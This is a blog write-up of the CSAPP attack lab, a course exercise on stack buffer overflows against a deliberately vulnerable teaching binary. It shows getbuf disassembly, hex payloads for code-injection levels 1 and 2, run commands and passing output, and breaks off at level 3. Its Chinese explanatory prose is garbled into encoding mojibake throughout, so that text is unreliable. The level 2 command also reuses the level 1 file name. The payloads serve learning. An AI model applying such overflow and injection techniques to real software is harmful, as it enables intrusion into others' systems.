<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="attackÂÆûÈ™åËØ¶ÁªÜËÆ∞ÂΩï">
<meta name="keywords" content="ÂÆûÈ™å„ÄÅattack„ÄÅCSAPP"><title>CSAPP:attackÂÆûÈ™å</title>

<link rel='canonical' href='https://chenyuan1125.github.io/en/p/csappattack%E5%AE%9E%E9%AA%8C/'>

<link rel="stylesheet" href="/scss/style.min.1d7a77f66a9605dfbac1c7922a91290042c454a1166056d913fcbcea340dd583.css"><meta property='og:title' content="CSAPP:attackÂÆûÈ™å">
<meta property='og:description' content="attackÂÆûÈ™åËØ¶ÁªÜËÆ∞ÂΩï">
<meta property='og:url' content='https://chenyuan1125.github.io/en/p/csappattack%E5%AE%9E%E9%AA%8C/'>
<meta property='og:site_name' content='Lee'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CSAPP' /><meta property='article:published_time' content='2024-09-29T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2024-10-05T19:03:09&#43;08:00'/><meta property='og:image' content='https://chenyuan1125.github.io/en/p/csappattack%E5%AE%9E%E9%AA%8C/R.jpg' />
<meta name="twitter:title" content="CSAPP:attackÂÆûÈ™å">
<meta name="twitter:description" content="attackÂÆûÈ™åËØ¶ÁªÜËÆ∞ÂΩï"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://chenyuan1125.github.io/en/p/csappattack%E5%AE%9E%E9%AA%8C/R.jpg' />

<link rel="stylesheet" href="https://s1.hdslb.com/bfs/static/jinkela/long/font/regular.css" />
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/en/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu4999655723030452168.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üç•</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/en">Lee</a></h1>
            <h2 class="site-description">Â§©Â∞ÜÈôçÂ§ß‰ªª‰∫éÊñØ‰∫∫‰πü</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='/'
                        
                        title="È¶ñÈ°µ&amp;ÂÖ≥‰∫é"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/chenyuan1125'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/en/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/en/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>ÂÖ≥‰∫é</span>
            </a>
        </li>
        
        
        <li >
            <a href='/en/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>ÂΩíÊ°£</span>
            </a>
        </li>
        
        
        <li >
            <a href='/en/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>ÊêúÁ¥¢</span>
            </a>
        </li>
        
        
        <li >
            <a href='/en/%E9%93%BE%E6%8E%A5/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>ÈìæÊé•</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">
                    
                        <li id="i18n-switch">  
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 5h7" />
  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
  <path d="M12 20l4 -9l4 9" />
  <path d="M19.1 18h-6.2" />
</svg>



                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
                                
                                    <option value="https://chenyuan1125.github.io/en/" selected>English</option>
                                
                                    <option value="https://chenyuan1125.github.io/" >‰∏≠Êñá</option>
                                
                            </select>
                        </li>
                    
                

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>Dark Mode</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#part-icode-injection-attacks">Part I:Code Injection Attacks</a>
      <ol>
        <li><a href="#level-1">Level 1</a></li>
        <li><a href="#level-2">Level 2</a></li>
        <li><a href="#level3">Level3</a></li>
        <li><a href="#Ê≥®ÂÖ•‰ª£Á†Å">Ê≥®ÂÖ•‰ª£Á†Å</a></li>
        <li><a href="#Ê†àÂ∏ßËÆ≤Ëß£">Ê†àÂ∏ßËÆ≤Ëß£</a></li>
        <li><a href="#solution">Solution</a></li>
      </ol>
    </li>
    <li><a href="#part-iireturn-oriented-programing">Part II:Return-Oriented Programing</a>
      <ol>
        <li><a href="#level1">level1</a></li>
        <li><a href="#solution-1">Solution</a></li>
        <li><a href="#level2">level2</a></li>
        <li><a href="#Ê†àÂ∏ßËÆ≤Ëß£-1">Ê†àÂ∏ßËÆ≤Ëß£</a></li>
        <li><a href="#solution-2">Solution</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/en/p/csappattack%E5%AE%9E%E9%AA%8C/">
                <img src="/en/p/csappattack%E5%AE%9E%E9%AA%8C/R_hu8255243502125017912.jpg"
                        srcset="/en/p/csappattack%E5%AE%9E%E9%AA%8C/R_hu8255243502125017912.jpg 800w, /en/p/csappattack%E5%AE%9E%E9%AA%8C/R_hu11264397315011635515.jpg 1600w"
                        width="800" 
                        height="450" 
                        loading="lazy"
                        alt="Featured image of post CSAPP:attackÂÆûÈ™å" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/en/categories/%E5%AE%9E%E9%AA%8C/" style="background-color: #2a9d8f; color: #fff;">
                ÂÆûÈ™å
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/en/p/csappattack%E5%AE%9E%E9%AA%8C/">CSAPP:attackÂÆûÈ™å</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            attackÂÆûÈ™åËØ¶ÁªÜËÆ∞ÂΩï
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2024-09-29</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    8 minute read
                </time>
            </div>
        
        <div>
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-eye" viewBox="0 0 16 16">
  <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM1.173 8a13.133 13.133 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.133 13.133 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5c-2.12 0-3.879-1.168-5.168-2.457A13.134 13.134 0 0 1 1.172 8z"/>
  <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0z"/>
</svg>
                <time class="article-words">
                    3735Â≠ó
                </time>
        </div>
        

    </footer>
    

    
        <footer class="article-translations">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 5h7" />
  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
  <path d="M12 20l4 -9l4 9" />
  <path d="M19.1 18h-6.2" />
</svg>



            <div>
                
                    <a href="https://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/" class="link">‰∏≠Êñá</a>
                
            </div>
            

        </footer>
    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="attack-lab">Attack lab
</h1><p>ËØ•ÂÆûÈ™åÂú®ÊàëÁîµËÑëÁöÑwslÁöÑubuntuÊìç‰ΩúÁ≥ªÁªü‰∏ãÊó†Ê≥ïÊ≠£Â∏∏ËøêË°åÔºåÂú®debianÁéØÂ¢É‰∏ãËÉΩÊ≠£Â∏∏ËøêË°åÔºåÊ≥®ÊÑèËøêË°åÊó∂Ë¶ÅÂä†‰∏ä-q</p>
<h2 id="part-icode-injection-attacks">Part I:Code Injection Attacks
</h2><h3 id="level-1">Level 1
</h3><p>ÈÄöËøáËæìÂÖ•Â≠óÁ¨¶‰∏≤ÔºåÂà©Áî®Ê†àÊ∫¢Âá∫ÂéüÁêÜÔºåÂ∞ÜgetbufÂáΩÊï∞ÁöÑËøîÂõûÂú∞ÂùÄÊîπÊàêtouch1ÂáΩÊï∞ÁöÑÂÖ•Âè£Âú∞ÂùÄ</p>
<p>Ê≥®ÊÑèÂ≠óËäÇÈ°∫Â∫è</p>
<p>getbufÂáΩÊï∞ÁöÑÂèçÊ±áÁºñ‰ª£Á†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">00000000004017a8 &lt;getbuf&gt;:
</span></span><span class="line"><span class="cl">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
</span></span><span class="line"><span class="cl">  4017ac:	48 89 e7             	mov    %rsp,%rdi
</span></span><span class="line"><span class="cl">  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;
</span></span><span class="line"><span class="cl">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
</span></span><span class="line"><span class="cl">  4017b9:	48 83 c4 28          	add    $0x28,%rsp
</span></span><span class="line"><span class="cl">  4017bd:	c3                   	ret    
</span></span><span class="line"><span class="cl">  4017be:	90                   	nop
</span></span><span class="line"><span class="cl">  4017bf:	90                   	nop
</span></span></code></pre></td></tr></table>
</div>
</div><p>phase_1.txtÊñá‰ª∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00 
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00 
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">c0 17 40 00 00 00 00 00
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøêË°åÂëΩ‰ª§</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./hex2raw &lt; phase_1.txt |./ctarget -q
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="level-2">Level 2
</h3><p>level2ÈúÄË¶ÅÂ∞ÜvlevelÁöÑÂÄºÊîπÊàêcookieÂÄºÔºåÂÜçreturnÂà∞touch2ÂáΩÊï∞ÂÖ•Âè£Â§Ñ„ÄÇ</p>
<p>‰øÆÊîπÂêéÁöÑrspÂØÑÂ≠òÂô®Â¶Ç‰∏ãÊâÄÁ§∫Ôºö</p>
<p><img src="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/phase2.png"
	width="743"
	height="584"
	srcset="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/phase2_hu13663029604867286409.png 480w, /en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/phase2_hu11577064378276042830.png 1024w"
	loading="lazy"
	
		alt="Âõæ1"
	
	
		class="gallery-image" 
		data-flex-grow="127"
		data-flex-basis="305px"
	
></p>
<p>phase_2.txtÊñá‰ª∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">48 c7 c7 fa 97 b9 59 68
</span></span><span class="line"><span class="cl">ec 17 40 00 c3 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">78 dc 61 55 00 00 00 00
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøêË°åÂëΩ‰ª§</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">./hex2raw &lt; phase_1.txt <span class="p">|</span>./ctarget -q
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁªìÊûú</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Cookie: 0x59b997fa
</span></span><span class="line"><span class="cl">Type string:Touch2!: You called touch2<span class="o">(</span>0x59b997fa<span class="o">)</span>
</span></span><span class="line"><span class="cl">Valid solution <span class="k">for</span> level <span class="m">2</span> with target ctarget
</span></span><span class="line"><span class="cl">PASS: Would have posted the following:
</span></span><span class="line"><span class="cl">        user id bovik
</span></span><span class="line"><span class="cl">        course  15213-f15
</span></span><span class="line"><span class="cl">        lab     attacklab
</span></span><span class="line"><span class="cl">        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA <span class="m">97</span> B9 <span class="m">59</span> <span class="m">68</span> EC <span class="m">17</span> <span class="m">40</span> <span class="m">00</span> C3 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">78</span> DC <span class="m">61</span> <span class="m">55</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="level3">Level3
</h3><p>Êú¨È¢ò‰∏é‰∏äÈ¢òÁ±ª‰ººÔºå‰∏çÂêåÁÇπÂú®‰∫é‰º†ÁöÑÂèÇÊï∞ÊòØ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤„ÄÇÂÖàÁªôÂá∫<code>touch3</code>ÁöÑCËØ≠Ë®Ä‰ª£Á†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">touch3</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">sval</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">vlevel</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span> <span class="cm">/* Part of validation protocol */</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">hexmatch</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">sval</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Touch3!: You called touch3(</span><span class="se">\&#34;</span><span class="s">%s</span><span class="se">\&#34;</span><span class="s">)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">sval</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">validate</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Misfire: You called touch3(</span><span class="se">\&#34;</span><span class="s">%s</span><span class="se">\&#34;</span><span class="s">)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">sval</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">fail</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>touch3</code>‰∏≠Ë∞ÉÁî®‰∫Ü<code>hexmatch</code>ÔºåÂÆÉÁöÑCËØ≠Ë®Ä‰ª£Á†Å‰∏∫Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* Compare string to hex represention of unsigned value */</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">hexmatch</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">val</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">sval</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">cbuf</span><span class="p">[</span><span class="mi">110</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* Make position of check string unpredictable */</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="n">cbuf</span> <span class="o">+</span> <span class="nf">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">100</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sprintf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#34;%.8x&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">strncmp</span><span class="p">(</span><span class="n">sval</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰πüÂ∞±ÊòØËØ¥ÔºåË¶ÅÊää<code>cookie</code>ËΩ¨Êç¢ÊàêÂØπÂ∫îÁöÑÂ≠óÁ¨¶‰∏≤‰º†ËøõÂéª</p>
<p>Ê≥®ÊÑèÁ¨¨6Ë°åÔºå<code>s</code>ÁöÑ‰ΩçÁΩÆÊòØÈöèÊú∫ÁöÑÔºåÊàë‰ª¨ÂÜôÂú®<code>getbuf</code>Ê†à‰∏≠ÁöÑÂ≠óÁ¨¶‰∏≤ÂæàÊúâÂèØËÉΩË¢´Ë¶ÜÁõñÔºå‰∏ÄÊó¶Ë¢´Ë¶ÜÁõñÂ∞±Êó†Ê≥ïÊ≠£Â∏∏ÊØîËæÉ„ÄÇ</p>
<p>Âõ†Ê≠§ÔºåËÄÉËôëÊää<code>cookie</code>ÁöÑÂ≠óÁ¨¶‰∏≤Êï∞ÊçÆÂ≠òÂú®<code>test</code>ÁöÑÊ†à‰∏äÔºåÂÖ∂ÂÆÉÈÉ®ÂàÜ‰∏é‰∏äÈ¢òÁõ∏ÂêåÔºåËøôÈáå‰∏çÂÜçÈáçÂ§çÊÄùË∑Ø„ÄÇ</p>
<h3 id="Ê≥®ÂÖ•‰ª£Á†Å">Ê≥®ÂÖ•‰ª£Á†Å
</h3><p>ÂÖàÊü•Êâæ<code>test</code>Ê†àÈ°∂ÊåáÈíàÁöÑ‰ΩçÁΩÆÔºö</p>
<p><img src="https://pic3.zhimg.com/80/v2-a07be4da84c92ded046900c493aed9d6_1440w.webp"
	
	
	
	loading="lazy"
	
		alt="Âõæ2"
	
	
></p>
